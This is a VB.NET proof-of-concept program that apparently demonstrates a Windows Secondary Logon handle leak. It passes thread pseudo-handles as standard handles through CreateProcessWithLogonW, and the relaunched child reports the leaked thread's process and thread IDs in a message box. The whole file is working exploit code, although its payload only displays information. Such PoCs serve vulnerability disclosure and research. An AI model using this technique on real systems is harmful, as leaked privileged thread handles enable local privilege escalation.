Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports System.Environment


Namespace PoC_SecLogonStdHandleCS
    
    Class Program
        
        <Flags()>  _
        Enum CreationFlags
            
            CREATE_SUSPENDED = 4
            
            CREATE_NEW_CONSOLE = 16
            
            CREATE_NEW_PROCESS_GROUP = 512
            
            CREATE_UNICODE_ENVIRONMENT = 1024
            
            CREATE_SEPARATE_WOW_VDM = 2048
            
            CREATE_DEFAULT_ERROR_MODE = 67108864
        End Enum
        
        <Flags()>  _
        Enum LogonFlags
            
            LOGON_WITH_PROFILE = 1
            
            LOGON_NETCREDENTIALS_ONLY = 2
        End Enum
        
        Private Const STARTF_USESTDHANDLES As Integer = 256
        
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>  _
        Structure STARTUPINFO
            
            Public cb As Int32
            
            Public lpReserved As String
            
            Public lpDesktop As String
            
            Public lpTitle As String
            
            Public dwX As Int32
            
            Public dwY As Int32
            
            Public dwXSize As Int32
            
            Public dwYSize As Int32
            
            Public dwXCountChars As Int32
            
            Public dwYCountChars As Int32
            
            Public dwFillAttribute As Int32
            
            Public dwFlags As Int32
            
            Public wShowWindow As Int16
            
            Public cbReserved2 As Int16
            
            Public lpReserved2 As IntPtr
            
            Public hStdInput As IntPtr
            
            Public hStdOutput As IntPtr
            
            Public hStdError As IntPtr
        End Structure
        
        <StructLayout(LayoutKind.Sequential)>  _
        Structure PROCESS_INFORMATION
            
            Public hProcess As IntPtr
            
            Public hThread As IntPtr
            
            Public dwProcessId As Integer
            
            Public dwThreadId As Integer
        End Structure
        
        Private Declare Function CreateProcessWithLogonW Lib "advapi32.dll" (ByVal userName As String, ByVal domain As String, ByVal password As String, ByVal logonFlags As LogonFlags, ByVal applicationName As String, ByVal commandLine As String, ByVal creationFlags As CreationFlags, ByVal environment As IntPtr, ByVal currentDirectory As String, ByRef startupInfo As STARTUPINFO, ByRef processInformation As PROCESS_INFORMATION) As Boolean
        
        Private Const STD_INPUT_HANDLE As Integer = -10
        
        Private Declare Function GetStdHandle Lib "kernel32.dll" (ByVal nStdHandle As Integer) As IntPtr
        
        Public Declare Function GetProcessIdOfThread Lib "kernel32.dll" (ByVal handle As IntPtr) As Integer
        
        Public Declare Function GetThreadId Lib "kernel32.dll" (ByVal handle As IntPtr) As Integer

        ''' <summary>
        ''' The main entry point for the application.
        ''' </summary>
        <STAThread()>  _
        Public Shared Sub Main()


            Try
                If (Program.GetStdHandle(STD_INPUT_HANDLE) <> IntPtr.Zero) Then
                    Dim hThread As IntPtr = Program.GetStdHandle(STD_INPUT_HANDLE)
                    Dim pid As Integer = Program.GetProcessIdOfThread(hThread)
                    If (pid = 0) Then
                        Throw New Win32Exception(Marshal.GetLastWin32Error)
                    End If

                    Dim p As Process = Process.GetProcessById(pid)
                    MessageBox.Show(String.Format("Process {0} - Pid {1} - Tid {2}", p.ProcessName, pid, Program.GetThreadId(hThread)))
                Else
                    Dim startInfo As STARTUPINFO = New STARTUPINFO
                    Dim procInfo As PROCESS_INFORMATION = New PROCESS_INFORMATION
                    startInfo.cb = Marshal.SizeOf(startInfo)
                    startInfo.dwFlags = STARTF_USESTDHANDLES
                    startInfo.hStdInput = New IntPtr(-2)
                    startInfo.hStdError = New IntPtr(-2)
                    startInfo.hStdOutput = New IntPtr(-2)
                    Dim apppath As String = Process.GetCurrentProcess.MainModule.FileName
                    If Not Program.CreateProcessWithLogonW("user", "domain", "badger", LogonFlags.LOGON_NETCREDENTIALS_ONLY, apppath, "poc.exe", 0, IntPtr.Zero, Nothing, startInfo, procInfo) Then
                        Throw New Win32Exception(Marshal.GetLastWin32Error)
                    End If

                End If

            Catch ex As Exception
                MessageBox.Show(("Error: " + ex.Message), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try

        End Sub
    End Class
End Namespace
